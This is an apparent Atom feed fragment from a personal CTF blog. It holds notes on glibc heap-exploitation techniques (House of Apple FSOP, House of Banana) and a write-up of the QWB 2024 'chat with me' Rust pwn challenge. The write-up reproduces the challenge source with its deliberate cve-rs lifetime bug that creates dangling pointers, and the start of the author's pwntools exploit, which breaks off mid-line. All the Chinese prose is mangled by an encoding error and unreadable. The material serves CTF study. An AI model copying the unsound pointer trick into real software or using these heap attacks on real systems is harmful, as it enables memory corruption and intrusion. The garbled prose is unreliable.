class="lvl-2"><p>å–å‡ºä¸€ä¸ª0x110çš„chunkï¼ˆä»tcacheï¼‰ï¼Œç„¶åå†æ¬¡é‡Šæ”¾ä¸Šä¸€æ­¥ä¸­çš„aå—ï¼Œaå—æ­¤æ—¶è¢«æ”¾å…¥tcacheï¼Œè¿™é‡Œå½¢æˆäº†ä¸€ä¸ªé‡å </p></li><li class="lvl-2"><p>åˆ†é…ä¸€ä¸ª0x130çš„å †å—ï¼Œè¿™ä¼šä»unsorted binä¸­åˆå¹¶å¥½çš„å—åˆ‡å‰²ï¼Œè€Œè¿™æ—¶å€™æˆ‘ä»¬å–å¾—çš„è¿™ä¸ªchunkå¯ä»¥æ‹¿æ¥ä¿®æ”¹tcacheå¤´éƒ¨çš„aå—</p></li><li class="lvl-2"><p>ä¿®æ”¹fdåmallocä¸¤æ¬¡å³å¯</p></li></ul><h1>glibc 2.34+</h1><h2 id="Glibc-2-31-House-of-Pig">Glibc 2.31 House of Pig</h2><h2 id="House-of-Kiwi">House of Kiwi</h2><h2 id="House-of-Apple">House of Apple</h2><p>ä¸€ç§æ€æƒ³ã€‚åœ¨glibc 2.34+çš„ç‰ˆæœ¬ä¸­å·²ç»æ²¡æœ‰äº†malloc_hookè¿™ç§å‡½æ•°è®©æˆ‘ä»¬ä¸€æ¬¡å°±èƒ½getshellã€‚å †åˆ©ç”¨çš„æ€æƒ³æ›´å¤šçš„é›†ä¸­åˆ°äº†FSOPä¸Šã€‚</p><h3 id="v1">v1</h3><h3 id="v2">v2</h3><p>å‚è€ƒ<a href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/">How2Heapå®æˆ˜â€”â€”å¼ºç½‘æ¯2024babyheap</a>çš„æ¿å­ç”¨ä¸€æ¬¡largebin attackå°†io_list_allåŠ«æŒï¼Œç„¶åå°†vtableæ¢æˆwideç‰ˆæœ¬æ¥è®©å†…æ ¸ä»wvtableæ‰¾å‡½æ•°è°ƒç”¨ä»è€Œè§„é¿æ£€æŸ¥ï¼Œ*ï¼ˆwdata+0xe0ï¼‰+0x68å°±æ˜¯èƒ½åŠ«æŒæ§åˆ¶æµçš„åœ°æ–¹ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘ä»¬åŠ«æŒçš„æ—¶å€™ï¼Œrdiä¸­å­˜æ”¾çš„æ˜¯fpçš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬åŠ«æŒåˆ°çš„å †åœ°å€ï¼Œå€ŸåŠ©ä¸€äº›gadgetä»¥åŠsetcontextè¿™ç§æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å‡ ä¹æ‰€æœ‰çš„å¯„å­˜å™¨ï¼Œåªè¦å †ä¸Šå¸ƒå±€åˆç†ã€‚<br>åœ¨setcontextæœ€åä¼šå°†[rdx+0xa8]çš„å†…å®¹pushåˆ°æ ˆä¸Šç„¶åretï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ROPé“¾è·¯çš„å¼€å§‹ã€‚</p><h3 id="v3">v3</h3><h2 id="House-of-Banana">House of Banana</h2><p>æ”»å‡»_rtld_globalçš„ä¸€ç§æ–¹æ³•ã€‚åŠ«æŒrtld_globalåˆ°å¯å†™å †å—åé€šè¿‡ä¼ªé€ ç¨‹åºåŸºåœ°å€æˆ–è€…finiarrayçš„åŠæ³•ï¼Œè®©ç¨‹åºåœ¨è°ƒç”¨exit()é€€å‡ºçš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°ã€‚<br>rtld_globalçš„ç¬¬ä¸€å­—æ®µæ˜¯linkmapç»“æ„ä½“çš„åœ°å€ï¼Œæ— è®ºæ˜¯ä¼ªé€ linkmapè¿˜æ˜¯ç¯¡æ”¹æœ¬æ¥çš„ï¼Œå†æˆ–è€…æ”¹æ‰ç¨‹åºåŸºåœ°å€ï¼Œæˆ‘ä»¬æœ€ç»ˆæ˜¯è¦è®©</p><h2 id="House-of-Emma">House of Emma</h2><h2 id="tlor-list">tlor_list</h2><h2 id="Libc-GOT">Libc_GOT</h2><h2 id="io-obstack">io_obstack</h2><h2 id="House-of-Cat">House of Cat</h2><h2 id="House-of-Water-glibc-2-39-newest">House of Water(glibc 2.39 newest)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;~~æ‘†äº†ï¼Œ~~å¯ä»¥å‚è€ƒï¼š&lt;/p&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31&quot;&gt;https://bbs.kan</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap-rustâ€”â€”qwb2024_chat-with-me</title>
    <link href="https://zjw1nd.github.io/2024/12/12/rust-pwn-qwb2024-chat-with-me/"/>
    <id>https://zjw1nd.github.io/2024/12/12/rust-pwn-qwb2024-chat-with-me/</id>
    <published>2024-12-12T08:14:22.000Z</published>
    <updated>2025-03-11T12:47:30.122Z</updated>
    
    <content type="html"><![CDATA[<h1>é¢˜ç›®åˆ†æ</h1><p>åˆ°æ‰‹ä¹‹åæ˜¯ä¸€ä¸ªæ‰£äº†ç¬¦å·çš„rustç¨‹åºï¼Œéå¸¸çš„æ¶å¿ƒã€‚</p><h1>æœ€åçœ‹çœ‹å‡ºé¢˜äººçš„åˆ†äº«</h1><blockquote><p><a href="https://bbs.kanxue.com/thread-284240.htm">https://bbs.kanxue.com/thread-284240.htm</a></p></blockquote><h2 id="æºç ï¼š">æºç ï¼š</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, Read, Write&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> MAX_MSG_LEN: <span class="type">usize</span> = <span class="number">0x50</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    data: [<span class="type">u8</span>; MAX_MSG_LEN],</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        Msg &#123;</span><br><span class="line">            data: [<span class="number">0</span>; MAX_MSG_LEN],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">fmt</span>::Display <span class="keyword">for</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter) <span class="punctuation">-&gt;</span> fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;:?&#125;&quot;</span>, <span class="keyword">self</span>.data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">prompt</span>(msg: <span class="type">String</span>) &#123;</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; &gt; &quot;</span>, msg);</span><br><span class="line">    io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    msg_list: <span class="type">Vec</span>&lt;&amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg&gt;,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        ChatBox &#123;</span><br><span class="line">            msg_list: <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">add_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Adding a new message&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">push</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">get_ptr</span>());</span><br><span class="line">        <span class="built_in">println!</span>(</span><br><span class="line">            <span class="string">&quot;Successfully added a new message with index: &#123;&#125;&quot;</span>,</span><br><span class="line">            <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">len</span>() - <span class="number">1</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">show_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">edit_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Content&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">handle</span> = io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">lock</span>();</span><br><span class="line">        handle.<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>.msg_list[index].data).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">delete_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">remove</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">chat_box</span> = ChatBox::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;I am a chatting bot of QWB S8, you can chat with me.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;If you delight me, I will give you flag!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;This is function menu: &quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;2. show&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;3. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Choice&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">choice</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> choice).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">choice</span>: <span class="type">i8</span> = choice.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">match</span> choice &#123;</span><br><span class="line">            <span class="number">1</span> =&gt; chat_box.<span class="title function_ invoke__">add_msg</span>(),</span><br><span class="line">            <span class="number">2</span> =&gt; chat_box.<span class="title function_ invoke__">show_msg</span>(),</span><br><span class="line">            <span class="number">3</span> =&gt; chat_box.<span class="title function_ invoke__">edit_msg</span>(),</span><br><span class="line">            <span class="number">4</span> =&gt; chat_box.<span class="title function_ invoke__">delete_msg</span>(),</span><br><span class="line">            <span class="number">5</span> =&gt; <span class="keyword">break</span>,</span><br><span class="line">            _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Invalid Choice!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ¼æ´ç‚¹çš„æ ¸å¿ƒåœ¨äºè¿™ä¸ªpocå‡½æ•°ï¼Œæ¥è‡ªäº<a href="https://github.com/Speykious/cve-rs">cve-rs</a>å¹¶åœ¨UIUCTF2024 Rusty Pointerä¸­ç”¨è¿‡çš„ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();<span class="comment">// å®šä¹‰ä¸€ä¸ªå¸¸é‡ Sï¼Œå®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘ç©ºå…ƒç»„çš„å¼•ç”¨çš„å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®šä¹‰ä¸€ä¸ªæ³›å‹å‡½æ•° get_ptrï¼Œæ¥å—ä¸€ä¸ªå¯å˜å¼•ç”¨ xï¼Œå¹¶è¿”å›ä¸€ä¸ªä¸åŒç”Ÿå‘½å‘¨æœŸçš„å¯å˜å¼•ç”¨</span></span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="comment">// å®šä¹‰ä¸€ä¸ªè¾…åŠ©å‡½æ•° identï¼Œæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šä¸€ä¸ªå¼•ç”¨çš„å¼•ç”¨å’Œä¸€ä¸ªå¯å˜å¼•ç”¨</span></span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ fï¼ŒæŒ‡å‘ ident å‡½æ•°</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ç›®çš„æ˜¯â€œé€šè¿‡å¯¹å˜é‡é™æ€ç”Ÿå­˜å‘¨æœŸçš„æ··æ·†ï¼Œæ¬ºéª—ç¼–è¯‘å™¨ä¸é‡Šæ”¾ç¦»å¼€ç”Ÿå­˜æœŸçš„å˜é‡ï¼Œä»è€Œè·å¾—ä¸€ä¸ªç¦»å¼€ç”Ÿå‘½å‘¨æœŸåä»ç„¶å¯ç”¨çš„æŒ‡é’ˆâ€ï¼Œæœ¬é¢˜ä¸­vecé‡Œçš„é‚£ä¸€ä¸ªä¸ªæ ˆä¸Šåœ°å€èƒ½å¤Ÿè¢«ä½¿ç”¨å°±æ˜¯å› ä¸ºè¿™ä¸ªå‡½æ•°ã€‚åæ­£å°±æ˜¯æ¥å›å¥—å¨ƒï¼Œåˆ©ç”¨äº†ä¸€ä¸ªéª—è¿‡rustç¼–è¯‘å™¨ç”Ÿå‘½å‘¨æœŸçš„æŠ€å·§æ¥å®ç°è¿™ä¸€ç‚¹ã€‚</p><p>åŸç†è¿™å—å…ˆé¸½äº†ã€‚</p><h2 id="expï¼š">expï¼š</h2><p>å‡ºé¢˜äºº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">author: GeekCmore</span></span><br><span class="line"><span class="string">time: 2024-10-30 17:06:06</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">filename = <span class="string">&quot;/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span 